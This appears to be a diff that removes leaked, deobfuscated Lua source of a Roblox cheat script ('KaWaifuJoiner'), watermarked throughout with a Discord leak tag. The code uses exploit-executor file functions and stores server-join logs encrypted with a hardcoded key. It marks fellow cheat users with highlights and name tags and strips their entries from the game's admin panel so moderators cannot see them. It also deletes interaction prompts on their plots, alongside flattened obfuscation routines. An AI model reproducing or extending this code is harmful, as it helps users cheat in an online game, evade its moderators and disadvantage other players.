-							slicedn42 = (slicedn42 - slicedn45) / 2
-							slicedn43 = (slicedn43 - slicedn47) / 2
-							slicedn45 = slicedn42 % 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn47 = slicedn43 % 2
-
-							if slicedn45 ~= slicedn47 then
-								slicedn41 = 43
-								slicedn44 = 4
-							else
-								slicedn41 = 33
-							end
-						else
-							n = { [56] = 8, [48] = 0, [100] = 13, [52] = 4, [51] = 3, [66] = 11, [67] = 12 }
-							slicedn41 = 55  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn42 = 49
-							slicedn44 = 1
-						end
-
-						continue
-					end
-
-					if slicedn41 <= 23 then
-						if slicedn41 <= 19 then
-							if slicedn41 <= 17 then
-								if slicedn41 <= 16 then
-									char2 = string.char  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									byte = string.byte
-
-									if slicedn40 == 2 then
-										slicedn41 = 26
-										slicedn42 = n
-									else
-										slicedn41 = 0
-									end
-								else
-									slicedn41 = 11
-									n = 0  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									slicedn40 = 0
-									char2 = ""
-									tbl45 = { 0, nil, 1, tbl45, #v + 0 }
-								end
-							elseif slicedn41 <= 18 then
-								slicedn42 = (slicedn42 - slicedn45) / 2
-								slicedn43 = (slicedn43 - slicedn47) / 2
-								slicedn45 = slicedn42 % 2
-								slicedn47 = slicedn43 % 2
-
-								if slicedn45 ~= slicedn47 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									slicedn41 = 54
-									slicedn44 = 128
-								else
-									slicedn41 = 7
-								end
-							else
-								sliced108[sliced109] = char2
-								slicedn41 = 34
-							end
-						elseif slicedn41 <= 21 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							if slicedn41 <= 20 then
-								tbl45 = tbl45[4]
-								slicedn41 = 17
-							else
-								slicedn41 = 1
-								str15 = ""
-								tbl45 = { 1, 0, nil, 64, tbl45 }
-							end
-						elseif slicedn41 <= 22 then
-							slicedn42 = (slicedn42 - slicedn45) / 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn43 = (slicedn43 - slicedn47) / 2
-							slicedn45 = slicedn42 % 2
-							slicedn47 = slicedn43 % 2
-
-							if slicedn45 ~= slicedn47 then
-								slicedn41 = 32
-								slicedn44 = 32
-							else
-								slicedn41 = 58
-							end
-						else  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							str15 += 65536
-							slicedn41 = 51
-						end
-
-						continue
-					end
-
-					if slicedn41 <= 27 then
-						if slicedn41 <= 25 then
-							if slicedn41 <= 24 then
-								local sliced110 = tbl45[1]
-								local sliced111 = tbl45[3]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								local slicedn49 = tbl45[5] + sliced110
-								local flag25 = sliced110 <= 0
-								local flag26 = flag25 and slicedn49 >= sliced111 or not flag25 and slicedn49 <= sliced111
-								tbl45[5] = slicedn49
-
-								if flag26 then
-									slicedn41 = 21
-									slicedn48 = slicedn49
-								else
-									slicedn41 = 62
-								end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							else
-								local sliced110 = tbl45[3]
-								local sliced111 = tbl45[5]
-								local slicedn49 = tbl45[1] + sliced110
-								local flag25 = sliced110 <= 0
-								local flag26 = not flag25
-								local flag27 = slicedn49 >= sliced111
-								local flag28 = slicedn49 <= sliced111
-								flag27 = flag25 and flag27
-								flag27 = flag27 or flag26 and flag28  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								tbl45[1] = slicedn49
-
-								if flag27 then
-									slicedn41 = 50
-									str15 = slicedn49
-								else
-									slicedn41 = 60
-								end
-							end
-						elseif slicedn41 <= 26 then
-							n = slicedn42[3]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn40 = 4 * (slicedn42[1] % 64) + 1
-							slicedn43 = 2 * (slicedn42[2] % 128) - 1
-							slicedn41 = 52
-							tbl45 = { 1, -1, nil, 255, tbl45 }
-						else
-							local sliced110 = tbl45[4]
-							local sliced111 = tbl45[3]
-							local slicedn49 = tbl45[2] + sliced110
-							local flag25 = sliced110 <= 0
-							local flag26 = flag25 and slicedn49 >= sliced111 or not flag25 and slicedn49 <= sliced111  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							tbl45[2] = slicedn49
-
-							if flag26 then
-								slicedn41 = 63
-								slicedn42 = slicedn49
-							else
-								slicedn41 = 53
-							end
-						end
-
-						continue
-					end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-					if slicedn41 <= 29 then
-						if slicedn41 <= 28 then
-							n = (n + 1) % 256
-							slicedn40 = (slicedn40 + tbl44[n]) % 256
-							local sliced110 = tbl44[n]
-							tbl44[n] = tbl44[slicedn40]
-							tbl44[slicedn40] = sliced110
-							local sliced111 = byte(v, slicedn42)
-							slicedn43 = tbl44[(tbl44[n] + tbl44[slicedn40]) % 256]
-							slicedn44 = sliced111 % 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn45 = slicedn43 % 2
-
-							if slicedn44 ~= slicedn45 then
-								slicedn41 = 44
-								slicedn42 = sliced111
-							else
-								slicedn41 = 38
-								slicedn46 = 0
-								slicedn42 = sliced111
-							end
-
-							continue  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						end
-
-						return nil
-					end
-
-					if slicedn41 <= 30 then
-						slicedn46 += slicedn44
-						slicedn41 = 39
-					else
-						slicedn43 = { byte(n, 1, 64) }
-						slicedn41 = 24
-					end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				else
-					if slicedn41 <= 47 then
-						if slicedn41 <= 39 then
-							if slicedn41 <= 35 then
-								if slicedn41 <= 33 then
-									if slicedn41 <= 32 then
-										slicedn46 += slicedn44
-										slicedn41 = 58
-									else
-										slicedn42 = (slicedn42 - slicedn45) / 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										slicedn43 = (slicedn43 - slicedn47) / 2
-										slicedn45 = slicedn42 % 2
-										slicedn47 = slicedn43 % 2
-
-										if slicedn45 ~= slicedn47 then
-											slicedn41 = 30
-											slicedn44 = 8
-										else
-											slicedn41 = 39
-										end
-									end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-									continue
-								end
-
-								if slicedn41 <= 34 then
-									return
-								end
-								tbl45 = tbl45[4]
-								slicedn41 = 19
-								continue
-							end
-
-							if slicedn41 <= 37 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								if slicedn41 <= 36 then
-									slicedn41 = not slicedn45 and 61 or 9
-								else
-									tbl45 = tbl45[5]
-									slicedn41 = 59
-								end
-							elseif slicedn41 <= 38 then
-								slicedn42 = (slicedn42 - slicedn44) / 2
-								slicedn43 = (slicedn43 - slicedn45) / 2
-								slicedn45 = slicedn42 % 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn47 = slicedn43 % 2
-
-								if slicedn45 ~= slicedn47 then
-									slicedn41 = 49
-									slicedn44 = 2
-								else
-									slicedn41 = 14
-								end
-							else
-								slicedn42 = (slicedn42 - slicedn45) / 2
-								slicedn43 = (slicedn43 - slicedn47) / 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn45 = slicedn42 % 2
-								slicedn47 = slicedn43 % 2
-
-								if slicedn45 ~= slicedn47 then
-									slicedn41 = 48
-									slicedn44 = 16
-								else
-									slicedn41 = 22
-								end
-							end
-
-							continue  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						end
-
-						if slicedn41 <= 43 then
-							if slicedn41 <= 41 then
-								if slicedn41 <= 40 then
-									str15 -= 65536
-									slicedn41 = 47
-								else
-									n[slicedn42] = slicedn44
-									n[69] = 14
-									n[55] = 7  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									n[53] = 5
-									n[57] = 9
-									n[99] = 12
-									n[54] = 6
-									slicedn41 = 27
-									tbl45 = { tbl45, -1, 31, 1, nil }
-								end
-							elseif slicedn41 <= 42 then
-								slicedn43 = {}
-
-								slicedn46 = {  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									"a",
-									"6",
-									"b",
-									"3",
-									"5",
-									"e",
-									"2",
-									"0",
-									"d",
-									"1",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									"7",
-									"f",
-									"4",
-									"8",
-									"c",
-									"9",
-								}
-
-								slicedn41 = 24
-								slicedn42 = 3846715392
-								slicedn44 = -2141334987  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn45 = -1976388651
-								slicedn47 = 1
-								tbl45 = { 1, tbl45, 128, nil, 0 }
-							else
-								slicedn46 += slicedn44
-								slicedn41 = 33
-							end
-						elseif slicedn41 <= 45 then
-							if slicedn41 <= 44 then
-								slicedn41 = 38  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn46 = 1
-							else
-								slicedn41 = 10
-								tbl45 = { tbl45, 1, 32, nil, 0 }
-							end
-						elseif slicedn41 <= 46 then
-							tbl43[n] = char2(n)
-							tbl44[n] = n
-							n = (slicedn40 * n + slicedn43) % 256
-							slicedn41 = 52  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						else
-							n = (n - str15) / 65536
-							local slicedn49 = (slicedn40 + str15) % slicedn44
-							local slicedn50 = slicedn49 % slicedn45
-							slicedn40 = ((((slicedn49 - slicedn50) / slicedn45 * slicedn47 + slicedn50 * slicedn48) % slicedn45 * slicedn45 + slicedn50 * slicedn47) % slicedn44 + slicedn43) % slicedn44
-							slicedn41 = 25
-						end
-
-						continue
-					end
-
-					if slicedn41 <= 55 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						if slicedn41 <= 51 then
-							if slicedn41 <= 49 then
-								if slicedn41 <= 48 then
-									slicedn46 += slicedn44
-									slicedn41 = 22
-								else
-									slicedn46 += slicedn44
-									slicedn41 = 14
-								end
-							elseif slicedn41 <= 50 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								str15 = n % 65536
-								slicedn41 = str15 < 0 and 23 or 51
-							else
-								slicedn41 = str15 >= 65536 and 40 or 47
-							end
-						elseif slicedn41 <= 53 then
-							if slicedn41 <= 52 then
-								local sliced110 = tbl45[1]
-								local sliced111 = tbl45[4]
-								local slicedn49 = tbl45[2] + sliced110  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								local flag25 = sliced110 <= 0
-								local flag26 = not flag25
-								local flag27 = slicedn49 >= sliced111
-								local flag28 = slicedn49 <= sliced111
-								flag27 = flag25 and flag27
-								flag27 = flag27 or flag26 and flag28
-								tbl45[2] = slicedn49
-
-								if flag27 then
-									slicedn41 = 46
-									slicedn44 = slicedn49  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								else
-									slicedn41 = 37
-								end
-							else
-								tbl45 = tbl45[1]
-								slicedn41 = 26
-								slicedn42 = slicedn40
-							end
-						elseif slicedn41 <= 54 then
-							slicedn46 += slicedn44  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn41 = 7
-						else
-							n[slicedn42] = slicedn44
-							n[50] = 2
-							n[102] = 15
-							n[98] = 11
-							n[68] = 13
-							n[101] = 14
-							n[70] = 15
-							n[65] = 10  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn41 = 41
-							slicedn42 = 97
-							slicedn44 = 10
-						end
-
-						continue
-					end
-
-					if slicedn41 <= 59 then
-						if slicedn41 <= 57 then
-							if slicedn41 <= 56 then
-								local sliced110 = tbl45[3]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								local sliced111 = tbl45[1]
-								local slicedn49 = tbl45[5] + sliced110
-								local flag25 = sliced110 <= 0
-								local flag26 = flag25 and slicedn49 >= sliced111 or not flag25 and slicedn49 <= sliced111
-								tbl45[5] = slicedn49
-
-								if flag26 then
-									slicedn41 = 12
-									slicedn40 = slicedn49
-								else
-									slicedn41 = 20  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								end
-							else
-								slicedn41 = slicedn40 == 0 and 3 or 26
-							end
-						elseif slicedn41 <= 58 then
-							slicedn42 = (slicedn42 - slicedn45) / 2
-							slicedn43 = (slicedn43 - slicedn47) / 2
-							slicedn45 = slicedn42 % 2
-							slicedn47 = slicedn43 % 2
-
-							if slicedn45 ~= slicedn47 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn41 = 13
-								slicedn44 = 64
-							else
-								slicedn41 = 18
-							end
-						else
-							slicedn41 = 56
-							n = 0
-							tbl45 = { 255, nil, 1, tbl45, -1 }
-						end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-						continue
-					end
-
-					if slicedn41 <= 61 then
-						if slicedn41 <= 60 then
-							tbl45 = tbl45[4]
-							slicedn41 = 45
-							continue
-						end
-
-						break
-					end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-					if slicedn41 <= 62 then
-						tbl45 = tbl45[2]
-						slicedn41 = 15
-					else
-						local slicedn49 = slicedn42 * 2 + 1
-						local sliced110 = slicedn43[slicedn49]
-						local sliced111 = slicedn43[slicedn49 + 1]
-
-						if not sliced110 then
-							slicedn41 = 29
-						else  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							slicedn41 = 36
-							slicedn44 = sliced110
-							slicedn45 = sliced111
-						end
-					end
-				end
-			end
-
-			return nil
-		end
-
-		up_373 = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_374 = sliced106
-		up_375 = "\155\46\116\209\5\200\58\111\226\65\141\11\87\169\60\244\24\109\176\34\158\81\199\10\132\63\214\19\124\165\40\190"
-		up_376 = HttpService
-		up_377 = sliced104
-		up_378 = "kWf!JoinedLedgr0"
-		local function slicedfn71(B)local I=up_373 ;if not I then up_373 =up_374.new(up_375,up_374.modes.CBC,up_374.pads.Pkcs7);end;I=up_376:JSONEncode(B);return up_377.Encode(buffer.tostring(up_373 :Encrypt(up_378..I)));end
-		up_379 = nil
-		up_380 = sliced106
-		up_381 = "\155\46\116\209\5\200\58\111\226\65\141\11\87\169\60\244\24\109\176\34\158\81\199\10\132\63\214\19\124\165\40\190"
-		up_382 = sliced104  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_383 = HttpService
-		local function slicedfn72(B)local I,e=pcall(function()local H=up_379 ;if not H then up_379 =up_380.new(up_381,up_380.modes.CBC,up_380.pads.Pkcs7);end;H=buffer.fromstring(up_382.Decode(B));local B=up_379 :Decrypt(H);if type(B)~="buffer"then return nil;end;return up_383:JSONDecode(string.sub(buffer.tostring(B),17));end);if I and type(e)=="table"then return e;end;return nil;end
-		local tbl43 = {}
-		local flag25 = false
-
-		local function slicedfn73()
-			if flag25 then
-				return
-			end
-			flag25 = true
-
-			task.delay(1, function()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				flag25 = false
-
-				pcall(function()
-					writefile("KaWaifuJoiner_Joined.dat", slicedfn71(tbl43))
-				end)
-			end)
-		end
-
-		local tbl44 = { joined = true, failed = true, cleared = true }
-
-		local function slicedfn74()
-			if true then
-				tbl43 = {}  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				pcall(function()
-					if true then
-						if not isfile("KaWaifuJoiner_Joined.dat") then
-							return
-						end
-						local v = slicedfn72(readfile("KaWaifuJoiner_Joined.dat"))
-
-						if type(v) ~= "table" then
-							pcall(function()
-								writefile("KaWaifuJoiner_Joined.dat", slicedfn71({}))
-							end)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-							return
-						end
-
-						for k, sliced108 in pairs(v) do
-							local sliced109 = "string"
-
-							if type(k) == sliced109 and type(sliced108) == "table" and tbl44[sliced108.status] then
-								tbl43[k] = sliced108
-							end
-						end
-
-						return
-					end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				end)
-
-				return tbl43
-			end
-
-		end
-
-		local function slicedfn75(arg)
-			local tbl45 = {}
-			local v = tbl30 and tbl30[arg]
-
-			if v and v.animals then
-				for _, animal in ipairs(v.animals) do
-					local uuid = animal.UUID  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					local sliced108 = "string"
-
-					if type(uuid) == sliced108 and uuid ~= "" then
-						tbl45[uuid] = true
-					end
-				end
-
-			end
-
-			return tbl45
-		end
-
-		local function slicedfn76(arg)
-			local v = arg and tbl43[arg]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			local sliced108 = "table"
-			if type(v) ~= sliced108 then
-				return false
-			end
-			local uuids = v.uuids
-			if type(uuids) ~= "table" then
-				return false
-			end
-			local sliced109 = tbl30 and tbl30[arg]
-			if not (sliced109 and sliced109.animals) then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				return false
-			end
-
-			for _, animal in ipairs(sliced109.animals) do
-				local uuid = animal.UUID
-				if type(uuid) == "string" and uuid ~= "" and not uuids[uuid] then
-					return true
-				end
-			end
-
-			return false
-		end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-		local function slicedfn77(arg)
-			local v = arg and tbl43[arg]
-			local sliced108 = "table"
-			if type(v) == sliced108 and v.status == "joined" then
-				return not slicedfn76(arg)
-			end
-
-			if true then
-				return false
-			end
-
-		end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-		local function slicedfn78(arg, arg2)
-			if not arg or arg == "" then
-				return
-			end
-			tbl43[arg] = { jobId = arg, uuids = arg2 or slicedfn75(arg), ts = os.time(), status = "failed", missCount = 0 }
-			slicedfn73()
-		end
-
-		local function slicedfn79(arg)
-			if not arg or arg == "" then
-				return  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-			local v = tbl43[arg]
-
-			if type(v) == "table" and v.status == "joined" then
-				v.hidden = true
-				v.ts = os.time()
-				local sliced108 = "table"
-
-				if type(v.uuids) ~= sliced108 then
-					v.uuids = {}
-				end
-
-				for k in pairs(slicedfn75(arg)) do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					v.uuids[k] = true
-				end
-			else
-				if type(v) == "table" and v.status == "failed" then
-					return
-				end
-				local sliced108 = slicedfn75(arg)
-				local sliced109 = "table"
-
-				if type(v) == sliced109 and type(v.uuids) == "table" then
-					for k in pairs(v.uuids) do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						sliced108[k] = true
-					end
-
-				end
-
-				tbl43[arg] = { jobId = arg, uuids = sliced108, ts = os.time(), status = "cleared", missCount = 0 }
-			end
-
-			tbl33[arg] = nil
-			slicedfn73()
-		end
-
-		local function slicedfn80(arg)
-			if arg and tbl43[arg] then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				tbl43[arg] = nil
-				slicedfn73()
-			end
-		end
-
-		up_384 = slicedfn77
-		local function slicedfn81(B)return up_384 (B);end
-		up_385 = tbl43
-		local function slicedfn82(B)local I=B and up_385 [B];return type(I)=="table"and I.status=="failed";end
-
-		local function slicedfn83(arg)
-			local now2 = os.time()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			local jobId = game.JobId
-			local flag26 = false
-
-			for k, v in pairs(tbl43) do
-				if arg[k] then
-					if (tonumber(v.missCount) or 0) ~= 0 then
-						v.missCount = 0
-					end
-
-					v.ts = now2
-					flag26 = true
-				elseif k ~= jobId then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					v.missCount = (tonumber(v.missCount) or 0) + 1
-
-					if v.missCount >= 2 then
-						tbl43[k] = nil
-					end
-
-					flag26 = true
-				end
-			end
-
-			if jobId and jobId ~= "" then
-				if true then
-					local v = tbl43[jobId]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					local sliced108 = slicedfn75(jobId)
-
-					if type(v) == "table" and v.status == "joined" and type(v.uuids) == "table" then
-						for k in pairs(v.uuids) do
-							sliced108[k] = true
-						end
-					end
-
-					tbl43[jobId] = {
-						jobId = jobId,
-						uuids = sliced108,
-						ts = now2,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						status = "joined",
-						missCount = 0,
-						hidden = type(v) == "table" and v.status == "joined" and v.hidden or nil,
-					}
-
-					flag26 = true
-				end
-			end
-
-			if flag26 then
-				slicedfn73()
-			end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		end
-
-		local tbl45 = {
-			"Ganganzelli Trulala",
-			"Tob Tobi Tobi",
-			"Raccooni Jandelini",
-			"Rhino Helicopterino",
-			"Centrucci Nuclucci",
-			"Avocadorilla",
-			"Pineaplino",
-			"Lazy Ducky",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			"Brutto Gialutto",
-			"Gorillo Subwoofero",
-			"Tenini Ballini",
-			"Nooo my Hotspot",
-			"Noo my Present",
-			"Los Karkeritos",
-			"Los Spyderinis",
-			"Santa Hotspot",
-			"Triplito Tralaleritos",
-			"Pandanini Frostini",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			"Chrismasmamat",
-		}
-
-		local tbl46 = { "Common", "Rare", "Epic", "Legendary", "Mythic", "Brainrot God" }
-
-		local function slicedfn84()
-			if isfile("KaWaifuJoiner_WLProfiles.json") then
-				local ok, result = pcall(function()
-					return HttpService:JSONDecode(readfile("KaWaifuJoiner_WLProfiles.json"))
-				end)
-
-				if ok and type(result) == "table" then
-					if false then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					else
-						if type(result.Profiles) == "table" then
-							tbl36 = result.Profiles
-						end
-
-						if result.Active then
-							str14 = result.Active
-						end
-					end
-				end
-			end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-			for k, v in pairs(tbl36) do
-				local sliced108 = "string"
-
-				if type(k) ~= sliced108 or type(v) ~= "table" then
-					tbl36[k] = nil
-				else
-					if type(v.Global) ~= "table" then
-						v.Global = { Enabled = false, MinGen = 0 }
-					end
-
-					local sliced109 = "table"
-
-					if type(v.Items) ~= sliced109 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						v.Items = {}
-					end
-
-					for k2, item in pairs(v.Items) do
-						if type(k2) ~= "string" or type(item) ~= "table" then
-							v.Items[k2] = nil
-						elseif item.Mutations ~= nil and type(item.Mutations) ~= "table" then
-							item.Mutations = nil
-						end
-					end
-				end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-
-			if next(tbl36) == nil then
-				tbl36.Default = { Global = { Enabled = false, MinGen = 0 }, Items = {}, createdAt = 0 }
-			end
-		end
-
-		local function slicedfn85()
-			pcall(function()
-				if animals then
-
-					for k, animal in pairs(animals) do
-						if not (not table.find(tbl45, k) and table.find(tbl46, animal.Rarity)) then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							if not tbl34[k] then
-								tbl34[k] = true
-							end
-						end
-					end
-				end
-			end)
-
-			for k in pairs(tbl32.Items) do
-				tbl34[k] = true
-			end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		end
-
-		local color3 = Color3.fromRGB(255, 0, 0)
-		local tbl47 = {}
-		local tbl48 = {}
-		up_386 = localPlayer2
-		up_387 = tbl47
-		up_388 = tbl48
-		up_389 = color3
-		local function slicedfn86(B)if B==up_386 then return;end;local I=B.Character;if not I then return;end;local e,H=I:FindFirstChild("Head"),I:FindFirstChild("KaWaifu_NeonHighlight");if H and not H:IsA("Highlight")then H:Destroy();H=nil;end;local a=e and(e:FindFirstChild("KaWaifu_NameTag"));if a and not a:IsA("BillboardGui")then a:Destroy();a=nil;end;local K=tostring(B.UserId);if up_387 [K]and e then local L=up_388 [K]~=false;if L then if not H then B=Instance.new("Highlight");B.Name="KaWaifu_NeonHighlight";B.Adornee=I;B.FillColor=up_389;B.OutlineColor=Color3.new(1,0,0);B.FillTransparency=0.5;B.OutlineTransparency=0;B.DepthMode=Enum.HighlightDepthMode.AlwaysOnTop;B.Parent=I;end;elseif H then H:Destroy();end;local B;if not a then B=Instance.new("BillboardGui");B.Name="KaWaifu_NameTag";B.Adornee=e;B.Size=UDim2.new(0,200,0,50);B.StudsOffset=Vector3.new(0,3.5,0);B.AlwaysOnTop=true;B.Parent=e;else B=a;end;local I=B:FindFirstChild("TextLabel");if not I then I=Instance.new("TextLabel");I.BackgroundTransparency=1;I.Size=UDim2.new(1,0,1,0);I.TextStrokeTransparency=0;I.Font=Enum.Font.GothamBlack;I.TextSize=16;I.TextColor3=up_389;I.Text="";I.Parent=B;end;if not L~=I.RichText or I.Text==""then if L then I.RichText=false;I.Text="\240\159\140\184KaWaifu User\240\159\140\184";else I.RichText=true;I.Text="<font color=\"#FF0000\">\240\159\140\184KaWaifu User </font><font color=\"#4488FF\">(Offline)</font><font color=\"#FF0000\"> \240\159\140\184</font>";end;end;else if H then H:Destroy();end;if a then a:Destroy();end;end;end
-		up_390 = tbl47  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_391 = tbl48
-		up_392 = Players2
-		up_393 = slicedfn86
-		local tbl49 = {}
-		local tbl50 = {}
-
-		local function slicedfn87(player)
-			if tbl19.isAlive and not tbl19.isAlive() then
-				return
-			end
-
-			tbl49[#tbl49 + 1] = player.CharacterAdded:Connect(function()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				if not (tbl19.isAlive and not tbl19.isAlive()) then
-					task.wait(0.5)
-					slicedfn86(player)
-					return
-				end
-
-				if true then
-					return
-				end
-
-			end)
-
-			if player.Character then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				slicedfn86(player)
-			end
-		end
-
-		tbl49[#tbl49 + 1] = Players2.PlayerAdded:Connect(slicedfn87)
-
-		for _, player in ipairs(Players2:GetPlayers()) do
-			slicedfn87(player)
-		end
-
-		local tbl51 = {}
-		up_394 = localPlayer2
-		up_395 = Players2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_396 = tbl51
-		up_397 = false
-		up_398 = tbl19
-		up_399 = sliced103
-		up_400 = Players2
-		up_401 = tbl51
-		up_402 = tbl51
-		up_403 = "?"
-		up_404 = function()local B=up_394:FindFirstChild("PlayerGui");if not B then return;end;local I=B:FindFirstChild("AdminPanel");if not I then return;end;B=I:FindFirstChild("AdminPanel");if not B then return;end;I=B:FindFirstChild("Profiles");if not I then return;end;B=I:FindFirstChild("ScrollingFrame");if not B then return;end;local I={};for e,e in ipairs(up_395:GetPlayers())do if up_396[tostring(e.UserId)]then I[e.Name]=true;end;end;for e,e in ipairs(B:GetChildren())do if e:IsA("ImageButton")and e.Name~="Template"and I[e.Name]then e:Destroy();end;end;if not up_397 then up_397 =true;B.ChildAdded:Connect(function(B)if up_398.isAlive and not up_398.isAlive()then return;end;if not B:IsA("ImageButton")or B.Name=="Template"then return;end;if next(up_396)==nil then return;end;local I={};for e,e in ipairs(up_395:GetPlayers())do if up_396[tostring(e.UserId)]then I[e.Name]=true;end;end;if I[B.Name]then task.defer(function()if B and B.Parent then B:Destroy();end;end);end;end);end;end
-		up_405 = false  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		up_406 = function()if not up_399 then return;end;local B=workspace:FindFirstChild("Plots");if not B then return;end;local I={};for e,e in ipairs(up_400:GetPlayers())do if up_401[tostring(e.UserId)]then I[e.Name]=true;end;end;for e,H in pairs(up_399 )do if I[tostring(H.Channel.CacheTable.Owner)]then local w=B:FindFirstChild(e);if w then local B=w:FindFirstChild("AnimalPodiums");if B then for w,I in ipairs(B:GetChildren())do w=I:FindFirstChild("Base");if w then I=w:FindFirstChild("Spawn");if I then local w=I:FindFirstChild("PromptAttachment");if w then w:Destroy();end;end;end;end;end;end;end;end;end
-
-		up_407 = {
-			"",
-			"K",
-			"M",
-			"B",
-			"T",
-			"Qa",
-			"Qi",
-			"Sx",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			"Sp",
-			"Oc",
-			"No",
-			"Dc",
-			"Ud",
-			"Dd",
-			"Td",
-			"Qad",
-			"Qid",
-			"Sxd",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			"Spd",
-			"Ocd",
-			"Nod",
-			"Vg",
-			"Uvg",
-			"Dvg",
-			"Tvg",
-		}
-
-		up_408 = function(B,I)local e,H=I or 1,math.floor(math.log(math.max(1,math.abs(B)),1000));I=10^e;local a=math.floor(B*(I/1000^H))/I;return string.format("%."..e.."f",a):gsub("%.?0+$","")..(up_407[H+1]or"e+"..H);end
-		up_409 = slicedfn59  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		local function slicedfn88(B)return up_408(up_409(B)).."/s";end
-
-		local function slicedfn89(arg)
-			local index = arg.Index
-			if not index or not animals[index] then
-				return nil
-			end
-
-			local tbl52 = {
-				DisplayName = index,
-				Rarity = animals[index].Rarity,
-				Mutation = arg.Mutation,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				Traits = arg.Traits and table.concat(arg.Traits, ",") or nil,
-			}
-
-			tbl52.Generation = slicedfn57(tbl52.DisplayName, tbl52.Mutation, arg.Traits)
-
-			if not tbl52.Mutation then
-				tbl52.Mutation = "Normal"
-			end
-
-			return tbl52
-		end
-
-		local function slicedfn90()
-			if not sliced103 or not animals or not mutations or not traits then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				return {}
-			end
-			local tbl52 = {}
-
-			for _, v in pairs(sliced103) do
-				local ok, result = pcall(function()
-					return tostring(v.Channel.CacheTable.Owner)
-				end)
-
-				if ok and result == localPlayer2.Name then
-					local ok2, result2 = pcall(function()
-						return v.Channel.CacheTable.AnimalList  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					end)
-
-					if ok2 and result2 then
-						for k, sliced108 in pairs(result2) do
-							if type(sliced108) == "table" then
-								local uuid = sliced108.UUID or tostring(k)
-								local sliced109 = slicedfn89(sliced108)
-
-								if sliced109 then
-									tbl52[uuid] = sliced109
-								end
